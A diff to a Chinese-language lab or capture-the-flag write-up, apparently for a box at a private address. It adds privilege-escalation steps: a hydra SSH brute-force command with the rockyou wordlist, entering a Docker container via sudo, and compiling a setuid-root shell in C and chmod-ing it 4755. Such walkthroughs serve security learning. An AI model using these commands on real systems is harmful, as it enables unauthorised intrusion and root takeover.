@@ -102,5 +102,37 @@ sudo -l 尝试提权
 爆破密码
 `hydra -V -t 4 -l syd -P '/usr/share/wordlists/rockyou.txt.gz' ssh://192.168.1.132:22`
 
+![](attachments/Pasted%20image%2020230304174451.png)
 
+sudo -l
 
+![](attachments/Pasted%20image%2020230304174641.png)
+
+`sudo docker exec -it 1786dd63dedb /bin/bash`
+
+![](attachments/Pasted%20image%2020230304174836.png)
+
+本地编译一个用于提权的文件
+`gcc shell.c -o shell`
+
+```c
+int main(void) {
+
+    setgid(0); setuid(0);
+
+    execl("/bin/sh","sh",0);
+
+}
+```
+
+![](attachments/Pasted%20image%2020230304175352.png)
+
+在docker容器中wget,没有wget apt install一下
+啊不,有curl,然后chmod 4755 shell
+
+![](attachments/Pasted%20image%2020230304175934.png)
+
+当出去提权的时候发现,工作目录是wp-content,回去吧shell挪进去
+运行的时候发现
+
+![](attachments/Pasted%20image%2020230304180508.png)
